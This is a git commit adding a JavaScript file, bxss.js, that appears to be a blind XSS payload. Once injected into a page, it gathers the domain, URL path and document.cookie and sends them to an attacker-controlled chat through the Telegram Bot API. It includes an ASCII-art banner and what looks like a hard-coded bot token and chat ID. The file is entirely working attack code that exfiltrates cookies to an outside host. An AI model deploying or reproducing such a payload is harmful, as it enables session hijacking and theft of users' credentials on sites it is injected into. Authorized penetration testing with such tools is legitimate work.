d67d645670ed846ca39de84a6fd3b1346ffac8d7
Rio R <37596222+cl0ser@users.noreply.github.com>
2022-01-10 04:46:56 +0700

    Create bxss.js

---
+++ bxss.js
@@ -0,0 +1,20 @@
+var tokenBot = '5026532800:AAE2B42Aawe_8B6w-MjC2Y0rTitbxiF6TrE'; // Your "tokenBot" Here
+var chatId = '1666122168'; // Your "chatId" Here
+
+/*
+	 _                     _       _      
+	| |____  _____ ___    | |_ ___| | ___ 
+	| '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
+	| |_) >  <\__ \__ \___| ||  __/ |  __/
+	|_.__/_/\_\___/___/    \__\___|_|\___|
+	------ Blind XSS Alert Telegram ------
+	                           zerobyte.id
+*/
+
+function telegramSend(tokenBot, chatId) {
+	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.send();
+}
+telegramSend(tokenBot, chatId)
